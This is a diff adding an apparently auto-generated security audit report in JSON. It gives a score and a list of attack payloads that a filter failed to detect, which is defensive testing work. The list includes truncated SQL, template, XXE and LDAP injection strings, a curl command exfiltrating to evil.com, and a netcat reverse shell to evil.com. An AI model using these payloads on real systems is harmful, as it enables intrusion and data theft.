@@ -1,0 +1,22 @@
+{
+  "audit_date": "2025-11-07T09:03:51.279954",
+  "security_score": 68.88888888888889,
+  "vulnerabilities": [
+    "Undetected injection: '; WAITFOR DELAY '00:00:05'; --...",
+    "Undetected injection: ' AND (SELECT COUNT(*) FROM sysobjects) > 0 --...",
+    "Undetected injection: && curl -X POST http://evil.com/exfiltrate -d @/et...",
+    "Undetected injection: | nc -e /bin/sh evil.com 4444...",
+    "Undetected injection: {{7*7}}...",
+    "Undetected injection: ${7*7}...",
+    "Undetected injection: #{7*7}...",
+    "Undetected injection: <?xml version='1.0'?><!DOCTYPE root [<!ENTITY test...",
+    "Undetected injection: *)(uid=*))(|(uid=*...",
+    "Undetected injection: *)(|(objectClass=*))...",
+    "Privilege escalation possible",
+    "Rate limiting bypass possible",
+    "Information disclosure in header: Server",
+    "No DDoS protection detected"
+  ],
+  "total_tests": 45,
+  "passed_tests": 31
+}
